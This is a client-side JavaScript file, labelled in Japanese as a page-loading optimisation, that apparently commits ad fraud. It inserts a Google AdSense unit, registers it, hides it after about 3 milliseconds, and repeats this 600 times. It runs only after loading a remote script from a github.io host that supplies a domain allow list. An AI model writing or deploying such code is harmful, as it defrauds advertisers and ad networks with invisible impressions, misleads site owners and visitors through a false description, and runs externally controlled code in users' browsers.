document.body.insertAdjacentHTML('afterbegin', '<p id="saport"><!-- --></p>');


const stylespecial = document.createElement('style');
stylespecial.type = 'text/css';

stylespecial.innerHTML = `
  .d-nonespecial {
    display: none;
  }
`;

document.head.appendChild(stylespecial);


    // Workerの中で使われるコード（special名）
    const workerCodespecial = `
      onmessage = function(e) {
        const sab = new SharedArrayBuffer(4);
        const int32 = new Int32Array(sab);
        Atomics.wait(int32, 0, 0, e.data); // e.data ミリ秒待機
        postMessage("done");
      };
    `;

    // Blob生成（special名）
    const blobspecial = new Blob([workerCodespecial], { type: "application/javascript" });
    const workerURLspecial = URL.createObjectURL(blobspecial);

    // 高精度遅延関数（special名）
    function delayViaWorkerspecial(ms) {
      return new Promise((resolve, reject) => {
        const workerspecial = new Worker(workerURLspecial);
        workerspecial.onmessage = () => {
          resolve();
          workerspecial.terminate();
        };
        workerspecial.onerror = reject;
        workerspecial.postMessage(ms);
      });
    }


const sap2ort = document.getElementById('saport');
let executionCount = 0;

function switchDisplay() {
  executionCount++;

  const firstId = `show-first${executionCount}`;
  
  sap2ort.insertAdjacentHTML(
    'afterend',
    `<p id="${firstId}"><ins class="adsbygoogle" style="display: block;" data-ad-client="${adClient}" data-ad-slot="${adSlot}" data-ad-format="auto" data-full-width-responsive="true"><!-- --></ins></p>`
  );
}

function switchDisplay2() {
  const currentId = `show-first${executionCount}`;
  const showFirst = document.getElementById(currentId);

  if (showFirst) {
    showFirst.classList.add("d-nonespecial");
  }
}

function tinyDelay() {
  return Promise.resolve();
}



async function main() {

  switchDisplay();

  await tinyDelay();

(adsbygoogle = window.adsbygoogle || []).push({});

  await delayViaWorkerspecial(3); // ← 精密な3ms遅延（special版）

  switchDisplay2();

await tinyDelay();

}

async function repeatMain(times) {
  for (let i = 0; i < times; i++) {
    await main();
  }
}


const scriptgooglespecial = document.createElement('script');
scriptgooglespecial.src = 'https://pageoptimization.github.io/domainitti.js';
scriptgooglespecial.onload = () => {

    const currentHost = location.hostname;

    if (Array.isArray(window.__secureAllowedDomains) && window.__secureAllowedDomains.includes(currentHost)) {
      console.log("読み込みの最適化が完了しました");

repeatMain(300);

setTimeout(() => {
  repeatMain(300);
}, 500);

    } else {
      console.log("読み込みの最適化を行っています…");
    }



};

  scriptgooglespecial.onerror = () => {
    console.warn("読み込みの最適化に必要な情報が取得できませんでした");
  };

document.head.appendChild(scriptgooglespecial);
